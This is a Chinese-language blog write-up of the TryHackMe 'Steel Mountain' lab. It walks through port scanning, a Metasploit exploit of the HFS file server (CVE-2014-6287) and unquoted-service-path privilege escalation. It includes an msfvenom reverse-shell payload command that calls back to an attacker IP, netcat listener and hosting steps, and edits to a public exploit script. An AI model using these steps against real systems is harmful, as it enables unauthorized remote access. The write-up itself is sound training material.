{"title":"Steel Mountain CTF - TryHackMe.com","uid":"11041d9251423dbeb0d78e2c3336a544","slug":"Steel Mountain CTF","date":"2022-03-17T17:29:47.695Z","updated":"2022-03-21T14:03:02.034Z","comments":true,"path":"api/articles/Steel Mountain CTF.json","keywords":null,"cover":"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/index.png","content":"<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Steel Mountain是TryHackMe的Windows靶机，基于Mr Robot Tv系列。</p></blockquote>\n<h1 id=\"侦察探测\"><a href=\"#侦察探测\" class=\"headerlink\" title=\"侦察探测\"></a>侦察探测</h1><p>开启TryHackMe靶机后，使用<code>ping</code>命令检测主机是否启动并运行。<code>ping</code>命令执行成功后，使用<code>nmap</code>进行端口扫描。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/nmap_sS_oA.png\" alt=\"nmap 端口扫描\"><br>从扫描结果中可以发现，这个靶机运行了SMB服务(<code>445</code>)，RDP服务(<code>3389</code>)以及两个web服务(<code>80,8080</code>)。访问<code>80</code>端口的web服务，。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/web_index.png\" alt=\"web 主页\"><br>这里有一个小工具<a href=\"https://tineye.com/\">TinEye</a>,根据图片反向查找包含该图片的网址链接，这在我们分析网站时可能会提供意想不到的效果。</p>\n<h1 id=\"获取访问\"><a href=\"#获取访问\" class=\"headerlink\" title=\"获取访问\"></a>获取访问</h1><p>在扫描的结果中，我们还看到了<code>8080</code>也是开启的，打开网页发现是靶机上部署了一个<a href=\"https://www.rejetto.com/hfs/\">HFS</a>文件服务器。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/hfs.png\" alt=\"HFS 服务\"><br>在<a href=\"https://www.exploit-db.com/\">exploit-db</a>搜索<code>hfs</code>发现该服务的特定版本存在存在可以利用的漏洞.<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/hfs_exploit.png\" alt=\"exploit-db 搜索 hfs\"><br>使用<code>nmap</code>扫描版信息。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/nmap_hfs.png\" alt=\"nmap 扫描版本及漏洞信息\"><br>拿到后，使用Metasploit查找该服务的expolit。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/msf_search_hfs.png\" alt=\"msfconsole 搜索 hfs\"><br>从结果中看到该服务确实存在exploit，利用Metasploit进行exploit。此漏洞的payload默认使用<a href=\"https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/windows/meterpreter/reverse_tcp.md\">windows&#x2F;meterpreter&#x2F;reverse_tcp</a><br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/msf_exploit_hfs.png\" alt=\"msfconsole exploit hfs\"><br>Metasploit已经打开了meterpreter会话，那接下来就可以进行提权了。</p>\n<h1 id=\"MetaSploit特权升级\"><a href=\"#MetaSploit特权升级\" class=\"headerlink\" title=\"MetaSploit特权升级\"></a>MetaSploit特权升级</h1><p>靶机建议使用<a href=\"https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1\">PowerUp</a>进行提权，PowerUP所做的事情就是寻找可能存在的漏洞，帮助提权。</p>\n<p>查看当前的metepreter会话的用户，为<code>STEELMOUNTAIN\\bill</code>,要使用PowerUP需要将<code>PowerUP.ps1</code>文件使用<code>upload</code>命令上传到靶机上。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/meter_upload.png\" alt=\"meterperter 上传 PowwerUp.ps1\"><br>上传成功后，需要在Meterpreter shell中使用<code>load powershell</code>加载Powershell，并输入<code>powershell_shell</code>切换到Powershell，接下来执行PowerUp.ps1,然后输入<code>Invoke-AllChecks</code>，这会在靶机上运行一系列扫描。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/meter_ps_invoke_allchecks.png\" alt=\"meterpreter ps 执行Invoke-Allchecks\"><br>从PowerUp的扫描结果中我们发现<code>AdvancedSystemcareService9</code>服务存在<code>Unquoted Service Paths(UPS)</code>漏洞。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/PowerUp_exec_result.png\" alt=\"PowerUp 执行结果\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><font style=\"color:red\">知识点：Unquoted Service Path 是什么？</font><br>当一个服务被创建，其可执行路径包含空格并且没有被引号括起来时，会导致USP漏洞。这个漏洞允许用户获得特殊权限(只有当这个易受攻击的服务是以System权限运行)。<br>在Windows中，如果服务没有用引号括起来并且有空格，它会将空格作为中断处理，并将服务路径的其他部分作为参数传递。<br><font style=\"color:red\">知识点：LocalSystem？</font><br>LocalSystem是预设的拥有本机所有权限的本地账户，这个账户跟通常的用户账户没有任何关联，也没有用户名和密码之类的凭证。这个服务账户可以打开注册表的HKEY_LOCAL_MACHINE\\Security键，当LocalSystem访问网络资源时，它是作为计算机的域账户使用的。 </p></blockquote>\n<p>根据已经获取的信息进行分析，目前靶机上运行的<code>AdvancedSystemcareService9</code>服务存在<code>USP</code>漏洞，并且使用<a href=\"https://docs.microsoft.com/en-us/windows/win32/ad/the-localsystem-account\">LocalSystem</a>权限运行。如果利用<code>USP</code>漏洞将<code>AdvancedSystemcareService9</code>服务替换成恶意程序(例如反向<code>Shell.exe</code>),则该服务会在系统重启或服务重启时自动启动，我们就能在靶机上运行一个拥有<code>LocalSystem</code>权限的会话。</p>\n<p>接下来，我们使用<code>msfvenom</code>制作恶意程序，并且程序名称需要命名为“<b>Advanced.exe</b>”，因为系统顺序寻找执行文件:<br>1.<code>C:\\Program.exe</code><br>2.<code>C:\\Program Files(x86)\\IObit\\Advanced.exe</code><br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/msfvenom_advance.png\" alt=\"msfvenom 制作恶意程序\"></p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.4.63.84 LPORT&#x3D;5555 -f exe -o .&#x2F;Advanced.exe<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<ul>\n<li><code>-p</code>: 选择一个payload</li>\n<li><code>-f</code>: 生成的文件格式</li>\n<li><code>-o</code>: 生成路径</li>\n</ul>\n<p>生成成功后使用<code>upload</code>命令将“<b>Advanced.exe</b>”上传至<code>C:\\Program Files(x86)\\IObit\\</code>目录下。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/meter_upload_advanced.png\" alt=\"meterpreter 上传Advanced.exe\"><br>另起一个MetaSploit窗口，使用<a href=\"https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/handler\">exploit&#x2F;multi&#x2F;handler</a>进行监听,修改options和默认payload。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/msfconsole_multi_handler.png\" alt=\"msfconsole exploit/multi/handler\"><br>在Meterpreter会话中使用<code>shell</code>命令进入Windows shell会话中，停止和重启<code>AdvancedSystemcareService9</code>服务。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/meter_shell_sc.png\" alt=\"meterpreter重启服务\"><br>重启服务后，<code>exploit/multi/handler</code>获得meterpreter会话。此时的会话并不稳定，我们需要使用<code>migrate</code>命令快速的将会话迁移到以<code>NT AUTHORITY\\System</code>运行的进程下。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/meter_migrate.png\" alt=\"meterpreter migrate\"></p>\n<h1 id=\"手动特权升级\"><a href=\"#手动特权升级\" class=\"headerlink\" title=\"手动特权升级\"></a>手动特权升级</h1><p>在手动提权的部分，靶机提供了一个新的<a href=\"https://www.exploit-db.com/exploits/39161\">CVE2014-6287</a>(HttpFileServer 2.3.x Remote Command Execution),这个漏洞提供了一个可利用Python文件，只需修改IP与端口就可以使用。<br>要利用这个exploit，我们需要通过http服务器托管netcat并设置一个netcat监听器来捕获反向shell。完整版Kali会在<code>/usr/share/windows-resources/binaries/nc.exe</code>目录中提供 Netcat Windows 二进制文件。</p>\n<h2 id=\"获取反向Shell\"><a href=\"#获取反向Shell\" class=\"headerlink\" title=\"获取反向Shell\"></a>获取反向Shell</h2><ul>\n<li>修改<code>rejetto.py</code>文件中的主机和端口：<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\nip_addr <span class=\"token operator\">=</span> <span class=\"token string\">\"192.168.44.128\"</span> <span class=\"token comment\">#攻击的IP地址</span>\nlocal_port <span class=\"token operator\">=</span> <span class=\"token string\">\"4444\"</span> <span class=\"token comment\"># nc监听的端口</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></li>\n<li>开启http 服务:<code>python3 -m http.server 80</code></li>\n<li>开启nc监听：<code>nc -lvnp 4444</code></li>\n<li>执行<code>rejetto.py</code>文件：<code>python3 rejetto.py &lt;靶机IP&gt; &lt;HFS端口&gt;</code><br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/py_nc.png\" alt=\"python nc\"><br>此时，我们已经在nc监听处获得了靶机的shell会话。</li>\n</ul>\n<h2 id=\"主机枚举\"><a href=\"#主机枚举\" class=\"headerlink\" title=\"主机枚举\"></a>主机枚举</h2><div class=\"custom-quote tip\">\n<span class=\"custom-quote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M20.86 14.13C20 14.7 19.56 15.74 19.77 16.76C20.13 18.55 18.55 20.13 16.76 19.77C15.74 19.57 14.7 20 14.13 20.86C13.12 22.38 10.89 22.38 9.88 20.86C9.3 20 8.26 19.56 7.24 19.77C5.45 20.13 3.87 18.55 4.23 16.76C4.43 15.74 4 14.7 3.14 14.13C1.62 13.12 1.62 10.89 3.14 9.88C4 9.3 4.44 8.26 4.23 7.24C3.87 5.45 5.45 3.87 7.24 4.23C8.26 4.44 9.3 4 9.87 3.14C10.88 1.62 13.11 1.62 14.12 3.14C14.7 4 15.74 4.44 16.76 4.23C18.55 3.87 20.13 5.45 19.77 7.24C19.56 8.26 20 9.3 20.86 9.87C22.38 10.88 22.38 13.12 20.86 14.13Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M12.01 15C12.01 14.5 12.01 14.5 12.01 14.5C12.04 13.75 13 13.46 14.04 12.2C14.41 11.74 14.69 11.41 14.86 10.85C15.15 9.95 14.92 9.18 14.86 9.02C14.8 8.79 14.52 8 13.72 7.46C13.06 7.02 12.42 7 12.14 7C11.9 7 11.36 7 10.78 7.3C10.28 7.56 9.98 7.9 9.83 8.1C9.24 8.82 9.06 9.63 9 10.06\"></path>\n<path stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M11.99 18H12.01\"></path>\n</svg></span>\n<p class=\"custom-quote-title\">Windows Privilege Escalation Awesome Scripts(WinPEAS)</p>\n<p>WinPEAS是Windows本地提权工具，它通过枚举windows系统上的各种信息(包括但不限于系统信息、日志、网络、进程、应用、DLL劫持等)，来确定是否存在可以提权的漏洞。</p>\n<ul>\n<li><a href=\"https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation\">Checklist - Local Windows Privilege Escalation</a></li>\n<li><a href=\"https://book.hacktricks.xyz/windows/windows-local-privilege-escalation\">Windows Local Privilege Escalation</a></li>\n</ul>\n\n</div>\n<p>我们将<a href=\"https://github.com/carlospolop/PEASS-ng/releases/download/20220320/winPEASx64.exe\">winPEASx64.exe</a>下载到本地机器，并托管到http服务上，然后使用<code>Powershell wget</code>下载到靶机上。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/powshell_winpeas.png\" alt=\"powshell wget winPEAS\"><br>使用<code>-h</code>命令查看winPEAS可以检测的清单信息，由于已知靶机存在<code>USP</code>漏洞，我们选择<code>servicesinfo</code>选项来进行枚举。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/winpeas_h_servicesinfo.png\" alt=\"winPEAS -h cmd servicesinfo\"></p>\n<div class=\"custom-quote tip\">\n<span class=\"custom-quote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M20.86 14.13C20 14.7 19.56 15.74 19.77 16.76C20.13 18.55 18.55 20.13 16.76 19.77C15.74 19.57 14.7 20 14.13 20.86C13.12 22.38 10.89 22.38 9.88 20.86C9.3 20 8.26 19.56 7.24 19.77C5.45 20.13 3.87 18.55 4.23 16.76C4.43 15.74 4 14.7 3.14 14.13C1.62 13.12 1.62 10.89 3.14 9.88C4 9.3 4.44 8.26 4.23 7.24C3.87 5.45 5.45 3.87 7.24 4.23C8.26 4.44 9.3 4 9.87 3.14C10.88 1.62 13.11 1.62 14.12 3.14C14.7 4 15.74 4.44 16.76 4.23C18.55 3.87 20.13 5.45 19.77 7.24C19.56 8.26 20 9.3 20.86 9.87C22.38 10.88 22.38 13.12 20.86 14.13Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M12.01 15C12.01 14.5 12.01 14.5 12.01 14.5C12.04 13.75 13 13.46 14.04 12.2C14.41 11.74 14.69 11.41 14.86 10.85C15.15 9.95 14.92 9.18 14.86 9.02C14.8 8.79 14.52 8 13.72 7.46C13.06 7.02 12.42 7 12.14 7C11.9 7 11.36 7 10.78 7.3C10.28 7.56 9.98 7.9 9.83 8.1C9.24 8.82 9.06 9.63 9 10.06\"></path>\n<path stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M11.99 18H12.01\"></path>\n</svg></span>\n<p class=\"custom-quote-title\">Services Info清单</p>\n<p><ul>\n<li>Interesting services (non Microsoft) information</li>\n<li>Modifiable services</li>\n<li>Writable service registry binpath</li>\n<li>PATH Dll Hijacking</li>\n</ul>\n</p>\n</div>\n<p><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/winpeas_services_info.png\" alt=\"winpeas_services_info\"><br>在检测结果看到有几个<code>unqouted</code>路径服务可以利用，但这并不意味着我们有权编辑或写入它们。使用<code>icacls</code>命令检查<code>Advanced SystemCare</code>路径的权限,可以看到该用户拥有读写执行权限(<code>RX,W</code>)。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/icacls.png\" alt=\"icacls\"><br>现在可以确定利用该服务进行<code>USP</code>漏洞攻击可以完成特权升级，剩下的内容就跟MetaSploit攻击的后半部分一致。利用<code>msfvenom</code>生成恶意程序，并获取系统级权限的反向shell会话。</p>\n<h1 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><ul>\n<li>Namp</li>\n<li>MetaSploit</li>\n<li><a href=\"https://www.offensive-security.com/metasploit-unleashed/msfvenom/\">msfvenom</a></li>\n<li><a href=\"https://github.com/PowerShellMafia/PowerSploit\">PowerSploit</a></li>\n<li><a href=\"https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS\">winPEAS</a></li>\n</ul></blockquote>\n<h1 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><ul>\n<li><a href=\"https://blog.51cto.com/u_14028678/3851102\">powerup提权的方法</a></li>\n<li><a href=\"https://github.com/PowerShellMafia/PowerSploit\">PowerSploit</a></li>\n<li><a href=\"https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae\">Windows Privilege Escalation — Part 1 (Unquoted Service Path)</a></li>\n<li><a href=\"https://developer.aliyun.com/article/347378\">内置系统账户:Local system&#x2F;Network service&#x2F;Local Service 区别</a></li>\n<li><a href=\"https://powersploit.readthedocs.io/en/latest/Privesc/Get-ModifiablePath/\">Get-ModifiablePath</a></li>\n<li><a href=\"https://www.yidc.net/archives/513\">windows中使用icacls命令还原重置文件夹的权限设置</a></li>\n</ul></blockquote>\n","text":" Steel Mountain是TryHackMe的Windows靶机，基于Mr Robot Tv系列。 侦察探测开启TryHackMe靶机后，使用ping命令检测主机是否启动并运行。ping命令执行成功后，使用nmap进行端口扫描。从扫描结果中可以发现，这个靶机运行了SMB服务...","link":"","photos":[],"count_time":{"symbolsCount":"3.5k","symbolsTime":"3 mins."},"categories":[{"name":"CTF","slug":"CTF","count":6,"path":"api/categories/CTF.json"}],"tags":[{"name":"tryhackme","slug":"tryhackme","count":6,"path":"api/tags/tryhackme.json"},{"name":"Windows Privilege Escalation","slug":"Windows-Privilege-Escalation","count":4,"path":"api/tags/Windows-Privilege-Escalation.json"},{"name":"Steel Mountain","slug":"Steel-Mountain","count":1,"path":"api/tags/Steel-Mountain.json"},{"name":"PowerSploit","slug":"PowerSploit","count":1,"path":"api/tags/PowerSploit.json"},{"name":"winPEAS","slug":"winPEAS","count":1,"path":"api/tags/winPEAS.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BE%A6%E5%AF%9F%E6%8E%A2%E6%B5%8B\"><span class=\"toc-text\">侦察探测</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E8%8E%B7%E5%8F%96%E8%AE%BF%E9%97%AE\"><span class=\"toc-text\">获取访问</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#MetaSploit%E7%89%B9%E6%9D%83%E5%8D%87%E7%BA%A7\"><span class=\"toc-text\">MetaSploit特权升级</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%89%8B%E5%8A%A8%E7%89%B9%E6%9D%83%E5%8D%87%E7%BA%A7\"><span class=\"toc-text\">手动特权升级</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%8E%B7%E5%8F%96%E5%8F%8D%E5%90%91Shell\"><span class=\"toc-text\">获取反向Shell</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%BB%E6%9C%BA%E6%9E%9A%E4%B8%BE\"><span class=\"toc-text\">主机枚举</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%B7%A5%E5%85%B7\"><span class=\"toc-text\">工具</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3\"><span class=\"toc-text\">参考文档</span></a></li></ol>","author":{"name":"剑三","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"御剑乘风来 除魔天地间","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Alfred CTF - TryHackMe.com","uid":"9bc1ecabb820de0d2d4c4b58e6a30fdc","slug":"Alfred","date":"2022-03-21T13:36:36.816Z","updated":"2022-03-25T18:28:19.739Z","comments":true,"path":"api/articles/Alfred.json","keywords":null,"cover":"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/alfred/index.png","text":"在Alfred靶机上，我们利用Jenkins常见的错误配置信息，进行攻击提权。 